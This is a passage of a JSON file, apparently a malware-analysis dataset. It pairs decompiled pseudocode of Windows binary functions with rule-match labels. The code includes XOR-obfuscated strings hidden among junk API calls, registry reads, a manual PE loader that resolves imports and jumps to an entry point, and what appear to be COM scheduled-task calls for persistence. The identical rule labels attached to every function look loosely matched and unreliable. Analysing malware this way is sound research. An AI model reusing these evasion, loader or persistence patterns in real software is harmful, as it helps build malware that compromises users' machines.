        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040b4fa(int32_t *param_1, int32_t param_2)\n\n{\n    uint8_t *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uchar *puVar6;\n    int32_t iVar7;\n    code *pcVar8;\n    int32_t iVar9;\n    uint *puVar10;\n    uchar *puVar11;\n    uint ARG_0;\n    uint lpValueName;\n    uchar *var_70h;\n    int32_t *var_68h;\n    int32_t var_64h;\n    int32_t var_60h;\n    int32_t hKey;\n    uint lpType;\n    int32_t var_54h;\n    int32_t var_50h;\n    uchar *var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t lpcbData;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    *param_1 = 0;\n    param_1[1] = 0;\n    var_68h = param_1;\n    var_8h = param_2;\n    uVar2 = (*pcVar8)(0, 0x208);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    if (iVar3 != 0) {\n        var_50h = iVar3;\n        fcn.0040b055();\n        var_64h = fcn.0040b000(0x20019);\n        if (var_64h != 0) {\n            var_54h = 0;\n            var_48h = 0x6d5a5233;\n            puVar10 = &ARG_0;\n            for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            }\n            var_44h = 0x33335128;\n            puVar10 = &lpValueName;\n            for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            }\n            var_40h = 0x5228461f;\n            var_3ch = 0x512b6d7a;\n            var_38h = 0x460a3333;\n            var_34h = 0x6d165234;\n            var_30h = 0x33525122;\n            var_20h = 0x6d335251;\n            var_1ch._0_1_ = 0x46;\n            fcn.00401000(0x38);\n            iVar3 = var_60h;\n            iVar9 = 0;\n            iVar7 = &var_48h - var_60h;\n            do {\n                iVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessorNumber)();\n                if (iVar4 != 0xe9bebf) {\n                    var_ch = 5;\n                    puVar1 = iVar9 + iVar3;\n                    *puVar1 = *(&var_20h + iVar9 % 5) ^ puVar1[iVar7];\n                }\n                iVar9 = iVar9 + 1;\n            } while (iVar9 < 0x1c);\n            (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, iVar3, var_8h);\n            var_2ch = 0x701a331c;\n            var_28h = 0x331c6f69;\n            var_24h = 0x6f36700d;\n            var_18h = 0x70693339;\n            var_14h._0_2_ = 0x6f36;\n            do {\n                puVar10 = &var_20h;\n                for (iVar3 = 8; iVar3 != 0; iVar3 = iVar3 + -1) {\n                    *puVar10 = 0;\n                    puVar10 = puVar10 + 1;\n                }\n                puVar10 = &lpValueName;\n                for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n                    *puVar10 = 0;\n                    puVar10 = puVar10 + 1;\n                }\n                fcn.00401000(0x18);\n                iVar3 = var_ch;\n                iVar9 = 0;\n                iVar7 = &var_2ch - var_ch;\n                do {\n                    iVar5 = (*_sym.imp.USER32.dll_GetShellWindow)();\n                    iVar4 = var_54h;\n                    if (iVar5 != 0x1fa405) {\n                        var_8h = 6;\n                        *(iVar9 + iVar3) = *(&var_18h + iVar9 % 6) ^ (iVar9 + iVar3)[iVar7];\n                    }\n                    iVar9 = iVar9 + 1;\n                } while (iVar9 < 0xc);\n                (*_sym.imp.USER32.dll_wsprintfW)(&lpValueName, iVar3, &ARG_0, var_54h);\n                var_1h._0_1_ = '\\0';\n                var_4ch = NULL;\n                var_54h = iVar4 + 1;\n                var_8h = 0;\n                hKey = fcn.0040b000(0x20019);\n                param_1 = var_68h;\n                if (hKey != 0) {\n                    lpType = 3;\n                    lpcbData = 0;\n                    iVar9 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(hKey, &lpValueName, 0, &lpType, 0, &lpcbData);\n                    iVar7 = 0;\n                    if (iVar9 == 0) {\n                        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpcbData);\n                        var_70h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                        if (var_70h == NULL) {\n                            puVar6 = NULL;\n                            iVar9 = 0;\n                        }\n                        else {\n                            iVar4 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)\n                                              (hKey, &lpValueName, 0, &lpType, var_70h, &lpcbData);\n                            puVar6 = var_70h;\n                            iVar9 = lpcbData;\n                            if (iVar4 != 0) goto code_r0x0040b73c;\n                        }\n                        var_1h._0_1_ = '\\x01';\n                        iVar7 = iVar9;\n                        var_4ch = puVar6;\n                        var_8h = iVar9;\n                    }\ncode_r0x0040b73c:\n                    (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n                    if (((var_1h != '\\0') && (var_4ch != NULL)) && (iVar7 != 0)) {\n                        if (param_1[1] == 0) {\n                            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n                            iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                        }\n                        else {\n                            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, param_1[1], *param_1 + iVar7);\n                            iVar3 = (*_sym.imp.KERNEL32.dll_HeapReAlloc)(uVar2);\n                        }\n                        param_1[1] = iVar3;\n                        puVar6 = var_4ch;\n                        puVar11 = iVar3 + *param_1;\n                        for (iVar7 = var_8h; iVar7 != 0; iVar7 = iVar7 + -1) {\n                            *puVar11 = *puVar6;\n                            puVar6 = puVar6 + 1;\n                            puVar11 = puVar11 + 1;\n                        }\n                        *param_1 = *param_1 + var_8h;\n                        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_4ch);\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                        iVar3 = var_ch;\n                    }\n                }\n                pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            } while (var_1h != '\\0');\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(var_64h);\n            uVar2 = (*pcVar8)(0, var_60h);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            iVar3 = var_50h;\n        }\n        uVar2 = (*pcVar8)(0, iVar3);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    }\n    uVar2 = 1;\n    if ((*param_1 == 0) || (param_1[1] == 0)) {\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 2212
    },
    "0040b805": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040b805(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_8h = *0x41cd3c;\n    if (*0x41cdec != 0) {\n        return 1;\n    }\n    var_40h = 0x5a114f13;\n    var_3ch = 0x4f205042;\n    var_38h = 0x50545a0e;\n    var_34h = 0x5a034f2a;\n    var_30h = 0x4f015055;\n    var_2ch = 0x50505a31;\n    var_28h = 0x5a104f05;\n    var_24h = 0x4f00505d;\n    var_20h = 0x505d5a31;\n    var_1ch = 0x5a164f07;\n    var_18h = 0x4f0b5051;\n    var_14h = 0x50385a0c;\n    var_10h = 0x5a624f64;\n    var_ch._0_2_ = 0x5038;\n    fcn.00401000(0x60);\n    iVar1 = var_4h;\n    iVar5 = 0;\n    iVar2 = &var_40h - var_4h;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetCursor)();\n        if (iVar3 != 0xb2b84f) {\n            var_4h = 6;\n            *(iVar5 + iVar1) = *(&var_10h + iVar5 % 6) ^ (iVar5 + iVar1)[iVar2];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x30);\n    *0x41cdec = (*_sym.imp.KERNEL32.dll_CreateFileMappingW)(0xffffffff, 0, 4, 0, 0x208, iVar1);\n    uVar4 = var_8h;\n    if (*0x41cdec != 0) {\n        if ((*0x41cde8 != 0) ||\n           (*0x41cde8 = (*_sym.imp.KERNEL32.dll_MapViewOfFile)(*0x41cdec, 0xf001f, 0, 0, 0x208),  *0x41cde8 != 0)) {\n            (*_sym.imp.SHLWAPI.dll_StrCpyW)(*0x41cde8, uVar4);\n            uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar1);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n            return 1;\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(*0x41cdec);\n        *0x41cdec = 0;\n    }\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar1);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    return 0;\n}\n",
        "token_count": 836
    },
    "0040b9ea": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040b9ea(int32_t *param_1, int32_t *param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uchar *puVar3;\n    int32_t iVar4;\n    uchar *puVar5;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if ((param_1 != NULL) && (param_2 != NULL)) {\n        if (param_1[1] != 0) {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, param_1[1]);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        }\n        uVar2 = (*pcVar1)(0, *param_2);\n        puVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        param_1[1] = puVar3;\n        if (puVar3 != NULL) {\n            for (iVar4 = *param_2; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + 1;\n            }\n            *param_1 = *param_2;\n            puVar3 = param_2[1];\n            puVar5 = param_1[1];\n            for (iVar4 = *param_2; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar5 = *puVar3;\n                puVar3 = puVar3 + 1;\n                puVar5 = puVar5 + 1;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 371
    },
    "0040bf15": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040bf15(code **arg_8h)\n\n{\n    code **ppcVar1;\n    uint32_t uVar2;\n    code cVar3;\n    int16_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    char cVar7;\n    int32_t iVar8;\n    code **ppcVar9;\n    code *pcVar10;\n    uint32_t *puVar11;\n    uint32_t uVar12;\n    uint var_2ch;\n    uint var_28h;\n    code *var_24h;\n    uint var_20h;\n    uint32_t var_1ch;\n    uint *var_18h;\n    uint var_14h;\n    code *var_10h;\n    int32_t *var_ch;\n    code **var_8h;\n    uint32_t var_4h;\n    \n    ppcVar1 = arg_8h;\n    uVar12 = 0;\n    ppcVar9 = arg_8h[0xc];\n    if (ppcVar9 == NULL) {\n        ppcVar1 = arg_8h + 0xe;\n        pcVar10 = *arg_8h;\n        arg_8h = ppcVar9;\n        (*pcVar10)(0, 0, ppcVar1, &var_2ch);\n    }\n    else {\n        var_10h = ppcVar9[0xf] + ppcVar9;\n        var_24h = *(var_10h + 0x14);\n        var_1ch = *(var_10h + 6);\n        var_14h = 0;\n        arg_8h = ppcVar9;\n        if (*(var_10h + 0x80) != 0) {\n            var_ch = *(var_10h + 0x80) + ppcVar9;\n            iVar6 = var_ch[3];\n            if (iVar6 != 0) {\n                do {\n                    iVar8 = 0;\n                    cVar3 = *(iVar6 + arg_8h);\n                    if (cVar3 != 0x0) {\n                        ppcVar9 = ppcVar1 + 0x210;\n                        do {\n                            iVar8 = iVar8 + 1;\n                            *ppcVar9 = cVar3;\n                            ppcVar9 = ppcVar9 + 2;\n                            cVar3 = (iVar6 + arg_8h)[iVar8];\n                        } while (cVar3 != 0x0);\n                    }\n                    iVar4 = iVar8 * 2;\n                    *(ppcVar1 + 0xe) = iVar4;\n                    *(ppcVar1 + 0x3a) = iVar4 + 2;\n                    ppcVar1[0xf] = ppcVar1 + 0x210;\n                    iVar8 = (**ppcVar1)(0, 0, ppcVar1 + 0xe, &var_14h);\n                    if (iVar8 < 0) {\n                        iVar8 = -0x3ffffc91;\n                        break;\n                    }\n                    var_4h = 0;\n                    iVar6 = var_ch[4];\n                    iVar5 = *var_ch;\n                    if ((*var_ch != 0) || (iVar5 = iVar6,  iVar6 != 0)) {\n                        var_8h = iVar5 + arg_8h;\n                        var_18h = iVar6 + arg_8h;\n                        while( true ) {\n                            ppcVar9 = *var_8h;\n                            if (ppcVar9 == NULL) break;\n                            if (ppcVar9 < 0) {\n                                if ((ppcVar9 < arg_8h) || (*(var_10h + 0x50) + arg_8h <= ppcVar9)) {\n                                    var_4h = *var_8h;\n                                    ppcVar9 = NULL;\n                                }\n                            }\n                            else {\n                                ppcVar9 = ppcVar9 + arg_8h;\n                            }\n                            if (ppcVar9 != NULL) {\n                                pcVar10 = ppcVar9 + 2;\n                                iVar6 = 0;\n                                cVar3 = *pcVar10;\n                                while (cVar3 != 0x0) {\n                                    iVar6 = iVar6 + 1;\n                                    cVar3 = pcVar10[iVar6];\n                                }\n                                *(ppcVar1 + 0xe) = iVar6;\n                                ppcVar1[0xf] = pcVar10;\n                                ppcVar9 = ppcVar1 + 0xe;\n                                *(ppcVar1 + 0x3a) = iVar6 + 1;\n                            }\n                            iVar8 = (*ppcVar1[2])(var_14h, ppcVar9, var_4h, &var_20h);\n                            if (iVar8 < 0) {\n                                iVar8 = -0x3fffff86;\n                                break;\n                            }\n                            *var_18h = var_20h;\n                            var_8h = var_8h + 1;\n                            var_18h = var_18h + 1;\n                        }\n                    }\n                    iVar6 = var_ch[8];\n                    var_ch = var_ch + 5;\n                } while (iVar6 != 0);\n                if (iVar8 < 0) {\n                    return;\n                }\n            }\n        }\n        pcVar10 = var_10h;\n        var_ch = *(var_10h + 0x54);\n        iVar6 = (*ppcVar1[4])(0xffffffff, &arg_8h, &var_ch, 4, &var_28h);\n        if (var_1ch != 0) {\n            puVar11 = pcVar10 + var_24h + 0x3c;\n            do {\n                if (iVar6 < 0) {\n                    return;\n                }\n                uVar2 = *puVar11;\n                if ((uVar2 & 0x20000000) == 0) {\n                    if ((uVar2 & 0x40000000) == 0) {\n                        cVar7 = '\\x04';\n                    }\n                    else {\n                        cVar7 = (-((uVar2 & 0x80000000) != 0) & 2U) + 2;\n                    }\n                }\n                else {\n                    cVar7 = (-((uVar2 & 0x80000000) != 0) & 0x20U) + 0x20;\n                }\n                var_ch = puVar11[-7];\n                var_24h = puVar11[-6] + arg_8h;\n                iVar6 = (*ppcVar1[4])(0xffffffff, &var_24h, &var_ch, cVar7, &var_28h);\n                puVar11 = puVar11 + 10;\n                uVar12 = uVar12 + 1;\n                pcVar10 = var_10h;\n            } while (uVar12 < var_1ch);\n        }\n        if (-1 < iVar6) {\n            (*(*(pcVar10 + 0x28) + arg_8h))(arg_8h, 1, ppcVar1 + 6);\n        }\n    }\n    return;\n}\n",
        "token_count": 1584
    },
    "0040c19a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.0040c19a(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t *in_EDX;\n    int32_t *piVar6;\n    uint *puVar7;\n    int32_t iVar8;\n    uint ARG_0;\n    uint lpDst;\n    uint var_84h;\n    uint uStack132;\n    uint uStack128;\n    uint uStack124;\n    uint var_74h;\n    uint uStack116;\n    uint uStack112;\n    uint uStack108;\n    int32_t var_64h;\n    int32_t *var_60h;\n    uint32_t var_5ch;\n    int32_t *var_58h;\n    int32_t *var_54h;\n    int32_t *var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    int32_t *var_3ch;\n    int32_t var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint32_t var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t *var_10h;\n    int32_t pbstr;\n    uint var_8h;\n    \n    var_5ch = 0;\n    var_3ch = NULL;\n    puVar7 = &lpDst;\n    var_60h = in_EDX;\n    for (iVar5 = 0x208; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    puVar7 = &ARG_0;\n    for (iVar5 = 0x208; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    if (*0x41cd40 == 0) {\n        var_30h = 0x632f4e54;\n        var_2ch = 0x4e346210;\n        var_28h = 0x62076328;\n        var_24h = 0x63374e3e;\n        var_20h = 0x4e386202;\n        var_1ch = 0x62666334;\n        var_18h._0_2_ = 0x4e71;\n        pbstr = 0x637a4e71;\n        var_8h._0_2_ = 0x6243;\n        fcn.00401000(0x34);\n        piVar6 = var_10h;\n        iVar8 = 0;\n        var_38h = 6;\n        iVar5 = &var_30h - var_10h;\n        do {\n            iVar2 = (*_sym.imp.USER32.dll_GetClipboardOwner)();\n            if (iVar2 != 0x46897e) {\n                *(iVar8 + piVar6) = *(&pbstr + iVar8 % var_38h) ^ (iVar8 + piVar6)[iVar5];\n            }\n            iVar8 = iVar8 + 1;\n        } while (iVar8 < 0x1a);\n    }\n    else {\n        var_34h = 0x5833445f;\n        var_30h = 0x4437377d;\n        var_2ch = 0x37675820;\n        var_28h = 0x5835442e;\n        var_24h = 0x44343760;\n        var_20h = 0x377f5831;\n        var_1ch = 0x5855443f;\n        var_18h._0_2_ = 0x3732;\n        pbstr = 0x5870447a;\n        var_8h._0_2_ = 0x3732;\n        fcn.00401000(0x3c);\n        piVar6 = var_10h;\n        iVar8 = 0;\n        var_38h = 6;\n        iVar5 = &var_34h - var_10h;\n        do {\n            iVar2 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n            if (iVar2 != 0x18c3b7) {\n                *(iVar8 + piVar6) = *(&pbstr + iVar8 % var_38h) ^ (iVar8 + piVar6)[iVar5];\n            }\n            iVar8 = iVar8 + 1;\n        } while (iVar8 < 0x1e);\n    }\n    (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(piVar6, &lpDst, 0x104);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, piVar6);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    var_48h = 0x77026c62;\n    var_44h = 0x71494731;\n    var_40h = 0x6c476d04;\n    pbstr = 0x77716c47;\n    var_8h._0_2_ = CONCAT11(var_8h._1_1_, 0x6d);\n    fcn.00401000(0x18);\n    iVar5 = var_38h;\n    iVar2 = 0;\n    iVar8 = &var_48h - var_38h;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetMessagePos)();\n        if (iVar4 != 0x588351) {\n            var_10h = 0x5;\n            *(iVar2 + iVar5) = *(&pbstr + iVar2 % 5) ^ (iVar2 + iVar5)[iVar8];\n        }\n        iVar2 = iVar2 + 1;\n    } while (iVar2 < 0xc);\n    (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, iVar5, &lpDst, arg_10h);\n    iVar8 = (**(*var_58h + 0x44))(var_58h, &var_3ch);\n    if (-1 < iVar8) {\n        var_50h = NULL;\n        iVar8 = (**(*var_3ch + 0x30))(var_3ch, 0, &var_50h);\n        if (-1 < iVar8) {\n            var_54h = NULL;\n            iVar8 = (***var_50h)(var_50h, str.MbLk, &var_54h);\n            pcVar1 = _sym.imp.OLEAUT32.dll_SysReAllocString;\n            if (-1 < iVar8) {\n                pbstr = (*_sym.imp.OLEAUT32.dll_SysReAllocString)(arg_ch);\n                if (pbstr != 0) {\n                    iVar8 = (**(*var_54h + 0x2c))(var_54h, pbstr);\n                    if (-1 < iVar8) {\n                        var_10h = NULL;\n                        var_64h = (*pcVar1)(&ARG_0);\n                        pcVar1 = _sym.imp.OLEAUT32.dll_VariantClear;\n                        var_2ch = var_2ch & 0xffff0000;\n                        (*_sym.imp.OLEAUT32.dll_VariantClear)(&var_74h);\n                        var_84h = var_74h;\n                        uStack132 = uStack116;\n                        uStack128 = uStack112;\n                        uStack124 = uStack108;\n                        (*pcVar1)(&var_4ch);\n                        iVar5 = (**(*var_60h + 0x44))\n                                          (var_60h, arg_8h, var_58h, 6, var_4ch, var_48h, var_44h, var_40h, var_2ch, \n                                           var_28h, var_24h, var_20h, 3, var_84h, uStack132, uStack128, uStack124, \n                                           &var_10h);\n                        pcVar1 = _sym.imp.OLEAUT32.dll_VariantCopy;\n                        (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_4ch);\n                        (*pcVar1)(&var_74h);\n                        var_5ch = -1 < iVar5;\n                        if (var_5ch != 0) {\n                            (**(*var_10h + 8))(var_10h);\n                        }\n                        iVar5 = var_38h;\n                        if (var_64h != 0) {\n                            (*_sym.imp.OLEAUT32.dll_SysStringLen)(var_64h);\n                            iVar5 = var_38h;\n                        }\n                    }\n                    (*_sym.imp.OLEAUT32.dll_SysStringLen)(pbstr);\n                }\n                (**(*var_54h + 8))(var_54h);\n            }\n            (**(*var_50h + 8))(var_50h);\n        }\n        (**(*var_3ch + 8))(var_3ch);\n    }\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    return var_5ch;\n}\n",
        "token_count": 2120
    },
    "0040c840": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040c840(uint noname_0, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint in_EDX;\n    uint *puVar5;\n    int32_t iVar6;\n    uint ARG_0;\n    uint lpDst;\n    uint var_44h;\n    int32_t *var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_3ch = 0;\n    puVar5 = &lpDst;\n    var_44h = in_EDX;\n    for (iVar4 = 0x208; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    puVar5 = &ARG_0;\n    for (iVar4 = 0x208; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    if (*0x41cd40 == 0) {\n        var_34h = 0x632f4e54;\n        var_30h = 0x4e346210;\n        var_2ch = 0x62076328;\n        var_28h = 0x63374e3e;\n        var_24h = 0x4e386202;\n        var_20h = 0x62666334;\n        var_1ch._0_2_ = 0x4e71;\n        var_14h = 0x637a4e71;\n        var_10h = CONCAT22(var_10h._2_2_, 0x6243);\n        fcn.00401000(0x34);\n        iVar4 = var_ch;\n        iVar6 = 0;\n        var_ch = 6;\n        do {\n            iVar1 = (*_sym.imp.USER32.dll_GetClipboardOwner)();\n            if (iVar1 != 0x46897e) {\n                *(iVar6 + iVar4) = *(&var_14h + iVar6 % var_ch) ^ (iVar6 + iVar4)[&var_34h - iVar4];\n            }\n            iVar6 = iVar6 + 1;\n        } while (iVar6 < 0x1a);\n    }\n    else {\n        var_38h = 0x5833445f;\n        var_34h = 0x4437377d;\n        var_30h = 0x37675820;\n        var_2ch = 0x5835442e;\n        var_28h = 0x44343760;\n        var_24h = 0x377f5831;\n        var_20h = 0x5855443f;\n        var_1ch._0_2_ = 0x3732;\n        var_14h = 0x5870447a;\n        var_10h = CONCAT22(var_10h._2_2_, 0x3732);\n        fcn.00401000(0x3c);\n        iVar4 = var_4h;\n        iVar1 = 0;\n        var_ch = 6;\n        iVar6 = &var_38h - var_4h;\n        do {\n            iVar3 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n            if (iVar3 != 0x18c3b7) {\n                *(iVar1 + iVar4) = *(&var_14h + iVar1 % var_ch) ^ (iVar1 + iVar4)[iVar6];\n            }\n            iVar1 = iVar1 + 1;\n        } while (iVar1 < 0x1e);\n    }\n    (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(iVar4, &lpDst, 0x104);\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    var_18h = 0x77026c62;\n    var_14h = 0x71494731;\n    var_10h = 0x6c476d04;\n    var_ch = 0x77716c47;\n    var_8h._0_1_ = 0x6d;\n    fcn.00401000(0x18);\n    iVar4 = var_4h;\n    iVar1 = 0;\n    iVar6 = &var_18h - var_4h;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetMessagePos)();\n        if (iVar3 != 0x588351) {\n            var_4h = 5;\n            *(iVar1 + iVar4) = *(&var_ch + iVar1 % 5) ^ (iVar1 + iVar4)[iVar6];\n        }\n        iVar1 = iVar1 + 1;\n    } while (iVar1 < 0xc);\n    (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, iVar4, &lpDst, arg_ch);\n    (**(*var_40h + 0x80))(var_40h, var_44h);\n    iVar6 = (**(*var_40h + 0x88))(var_40h, 0x40f700);\n    if (((-1 < iVar6) && (iVar6 = (**(*var_40h + 0x70))(var_40h, 0x2000),  -1 < iVar6)) &&\n       (iVar6 = (**(*var_40h + 0x78))(var_40h, &ARG_0, 0),  -1 < iVar6)) {\n        (**(*var_40h + 0xa8))(var_40h, 0xfffffffe);\n        iVar6 = fcn.0040c716();\n        if (-1 < iVar6) {\n            var_3ch = 1;\n        }\n    }\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    return var_3ch;\n}\n",
        "token_count": 1474
    },
    "0040cb4f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040cb4f(void)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    int16_t *piVar3;\n    int16_t *piVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint uVar7;\n    int32_t iVar8;\n    uint *puVar9;\n    int16_t *piVar10;\n    uint lpFileName;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t *var_24h;\n    int32_t *var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t *ppv;\n    int16_t *var_10h;\n    int16_t *var_ch;\n    int32_t pszFirst;\n    uint var_4h;\n    \n    var_30h = 0x4721615d;\n    var_34h = 0;\n    var_24h = NULL;\n    ppv = NULL;\n    var_20h = NULL;\n    var_1ch = 0;\n    var_18h = 0;\n    var_2ch = 0x611b411b;\n    var_28h = 0x41774761;\n    pszFirst = 0x474d6139;\n    var_4h._0_2_ = 0x4177;\n    fcn.00401000(0x18);\n    piVar3 = var_10h;\n    iVar8 = 0;\n    iVar6 = &var_30h - var_10h;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_ReleaseCapture)();\n        if (iVar5 != 0x25b56c) {\n            var_10h = 0x6;\n            *(iVar8 + piVar3) = *(&pszFirst + iVar8 % 6) ^ (iVar8 + 